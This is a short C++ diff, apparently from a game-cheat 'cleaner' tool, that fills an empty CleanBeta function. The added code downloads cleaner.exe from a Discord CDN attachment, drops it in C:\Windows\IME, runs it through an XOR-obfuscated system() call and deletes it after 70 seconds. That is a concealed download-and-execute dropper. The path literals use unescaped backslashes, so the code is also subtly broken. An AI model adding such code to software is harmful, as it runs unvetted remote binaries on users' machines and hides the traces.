@@ -6,7 +6,14 @@ namespace Apple {
 
 	void CleanBeta()
 	{
-		//soon
+		//made by ritz#9999
+		string dwnld_URL = "https://cdn.discordapp.com/attachments/812106475106336769/813323501485686804/cleaner.exe";
+		string savepath = "C:\Windows\IME\cleaner.exe";
+		URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
+		//Sleep(1000);
+		system(_xor_("start C:\Windows\IME\cleaner.exe").c_str());
+		Sleep(70000);
+		remove("C:\Windows\IME\cleaner.exe");
 	}
 
 	void CleanNormal()
